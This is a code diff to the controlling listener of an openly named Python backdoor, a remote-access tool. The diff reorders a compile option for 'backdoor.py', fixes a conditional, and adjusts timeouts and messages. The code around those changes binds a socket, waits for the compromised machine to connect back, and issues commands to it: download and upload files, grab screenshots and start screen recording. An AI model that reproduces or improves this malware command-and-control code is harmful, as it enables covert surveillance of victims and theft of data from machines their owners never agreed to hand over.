@@ -26,25 +26,6 @@ if args['rhost']:
     RHOST = str(args['rhost'])
 if args['port']:
     PORT = int(args['port'])
-if args['compile']:
-    if str(args['compile']) == 'y':
-        try:
-            py_compile.compile("backdoor.py")
-            print(termcolor.colored("[+] Finished compiling", 'green'))
-            print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
-        except py_compile.PyCompileError:
-            print(termcolor.colored("[+] Error: can not compile :-(",'red'))
-    if str(args['compile']) == 'n':
-        pass
-    else:
-        print(termcolor.colored("[-] Error expected one argument", 'red'))
-        usernput = input(termcolor.colored("Do you want to exit y/n: "))
-        if usernput == 'y':
-            exit()
-        elif usernput == 'n':
-            os.system('clear')
-            pass
-
 
 
 def modify_backdoor():
@@ -83,7 +64,7 @@ def download_file(file_name):
         f.write(chunk)
         try:
             chunk = target.recv(1024)
-        except socket.timeout:
+        except socket.timeout as e:
             break
     target.settimeout(None)
     f.close()
@@ -114,7 +95,8 @@ def target_reqs():
         elif cmd == 'clear':
             os.system('clear')
         elif cmd[:3] == 'cd ':
-            print(reliable_recv())
+            l = reliable_recv()
+            print(l)
         elif cmd[:6] == 'upload':
             try:
                 upload_file(cmd[7:])
@@ -130,7 +112,7 @@ def target_reqs():
                 pass
         elif cmd == 'screenshot':
             f = open('screenshot%d.png' % count, 'wb')
-            target.settimeout(10)
+            target.settimeout(7)
             chunk = target.recv(1024)
             while chunk:
                 f.write(chunk)
@@ -162,7 +144,7 @@ def target_reqs():
 
         elif cmd[:13] == 'screen_record':
             if cmd[14:] == 'on':
-                print(termcolor.colored('[+] Go to http://*target ip*/:5000', 'green'))
+                print(termcolor.colored(f'[+] Go to http://{RHOST}/:5000', 'green'))
             elif cmd[14:] == 'off':
                 print(termcolor.colored('[+] Done', 'green'))
             else:
@@ -184,6 +166,24 @@ def target_reqs():
 
 
 modify_backdoor()
+if args['compile']:
+    if str(args['compile']) == 'y':
+        try:
+            py_compile.compile("backdoor.py")
+            print(termcolor.colored("[+] Finished compiling", 'green'))
+            print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
+        except py_compile.PyCompileError:
+            print(termcolor.colored("[+] Error: can not compile :-(",'red'))
+    elif str(args['compile']) == 'n':
+        pass
+    else:
+        print(termcolor.colored("[-] Error expected one argument", 'red'))
+        usernput = input(termcolor.colored("Do you want to exit y/n: "))
+        if usernput == 'y':
+            exit()
+        elif usernput == 'n':
+            os.system('clear')
+            pass
 skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 skt.bind((RHOST, PORT))
 print(termcolor.colored("[+] Listening for incoming requests", "green"))
